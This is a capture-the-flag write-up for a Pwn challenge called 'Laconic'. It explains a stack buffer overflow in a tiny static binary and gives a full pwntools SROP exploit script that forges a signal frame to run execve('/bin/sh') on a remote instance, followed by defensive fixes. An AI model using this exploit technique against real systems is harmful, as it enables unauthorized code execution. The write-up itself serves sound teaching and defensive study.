## Overview

**Laconic** is an Easy-rated Pwn challenge built around a tiny statically-linked binary that does nothing but `read()` input onto the stack and `ret`. With full control of the return address but no register-setup gadgets and no libc to borrow from, the path is **SROP** (Sigreturn-Oriented Programming): one forged signal frame restores every register and fires `execve("/bin/sh", 0, 0)`. The twist is locating the `/bin/sh` string — it sits at a file offset *past* the code segment's declared size, yet is still mapped because the kernel maps a whole page.

## The technique

The entire program is 26 bytes in a `.shellcode` section:

```nasm
__start (0x43000):
  mov rdi, 0          ; fd = stdin
  mov rsi, rsp        ; buf
  sub rsi, 8          ; buf = rsp-8
  mov rdx, 0x106      ; len = 262
  syscall             ; rax=0 at _start -> read(0, rsp-8, 0x106)
  ret                 ; return address is fully attacker-controlled
0x43018: pop rax ; ret
0x43015: syscall ; ret
```

`checksec`: No canary, **No PIE** (fixed base `0x42000`), executable / RWX stack. The `read` writes 262 bytes starting 8 bytes *below* the saved return address, so it walks straight over it — a classic [stack-based buffer overflow](https://cwe.mitre.org/data/definitions/121.html) with full RIP control.

To pop a shell we'd normally need `pop rdi; ret` etc. to set up syscall arguments. This binary has only `pop rax; ret` and `syscall; ret` — which is exactly enough for SROP:

1. `pop rax` → `rax = 15` (`rt_sigreturn`).
2. `syscall` → the kernel restores the **entire** register set from a `struct sigframe` sitting on the stack — a frame we forged.
3. The frame says `rax=59 (execve)`, `rdi=&"/bin/sh"`, `rsi=0`, `rdx=0`, `rip=`the `syscall` gadget. The instant `sigreturn` returns, it runs `execve("/bin/sh", 0, 0)`.

### Where is `/bin/sh`?

`strings`/`radare2` place `/bin/sh` at **file offset 0x1238**, which looks *outside* any loaded segment (the code segment's `FileSiz` is only `0x1a`). Dead end? No — the kernel maps memory a **page (0x1000 bytes) at a time**. The code segment loads file offset `0x1000` → vaddr `0x43000`, so the whole file page `0x1000–0x1fff` becomes vaddr `0x43000–0x43fff`. The string is mapped at:

```
0x43000 + (0x1238 - 0x1000) = 0x43238
```

The lesson: compute a literal's runtime address from the **page mapping**, not the segment's declared size — the leftover bytes at the end of a file page are mapped too.

## Solution

Create `solve.py`:

```python
from pwn import *
import sys
context.arch = 'amd64'

pop_rax = 0x43018      # pop rax ; ret
syscall = 0x43015      # syscall ; ret
binsh   = 0x43238      # "/bin/sh" mapped via the page, not the segment size

frame = SigreturnFrame()
frame.rax = constants.SYS_execve   # 59
frame.rdi = binsh                  # arg1 = "/bin/sh"
frame.rsi = 0                      # arg2 = NULL
frame.rdx = 0                      # arg3 = NULL
frame.rip = syscall                # fire execve right after sigreturn

payload  = b'A' * 8        # filler: buffer is rsp-8, saved RIP at rsp
payload += p64(pop_rax)    # saved RIP -> set rax = 15 (rt_sigreturn)
payload += p64(0xf)
payload += p64(syscall)    # syscall ; ret -> performs sigreturn
payload += bytes(frame)    # the forged sigcontext (execve)
payload  = payload[:0x106] # read() only takes 0x106 bytes

io = remote(sys.argv[1], int(sys.argv[2]))   # or process('./laconic') locally
io.send(payload)
io.interactive()
```

Run it against the instance:

```bash
python3 solve.py <target_ip> <port>
```

That drops a shell as the `ctf` user; `cat /flag*` prints the flag (`HTB{...}`).

## Why it worked

`rt_sigreturn` is designed to be called by the kernel at the end of signal handling, and it blindly restores **every** general register, `rip`, and `rsp` from a `sigcontext` on the user stack. When an attacker controls that stack memory, one `sigreturn` becomes "set all registers to anything, then run any syscall" — no gadget chain required. Here the only ingredients needed were a stack overflow, a `pop rax` to select syscall 15, a `syscall` instruction, and a known-mapped `/bin/sh` pointer. (Even though `SigreturnFrame` is 248 bytes and the `0x106` read truncates its tail, the cut-off `&fpstate` field lands on zeroed stack, so the kernel skips FP restore and `execve` still fires.)

## Fix / defense

- **Mark the stack/code non-executable (NX)** and don't ship a `/bin/sh` literal — removing the easy target.
- **Compile with `-fstack-protector-strong`**: a stack canary stops the saved-frame overwrite before `ret`.
- **`-fPIE -pie` + ASLR** so the gadget and string addresses aren't fixed.
- **Bound the read** to the destination buffer size — never `read()` more bytes than the buffer holds.
- **seccomp** to forbid `execve` so a forged frame can't spawn a shell even if the overflow lands.
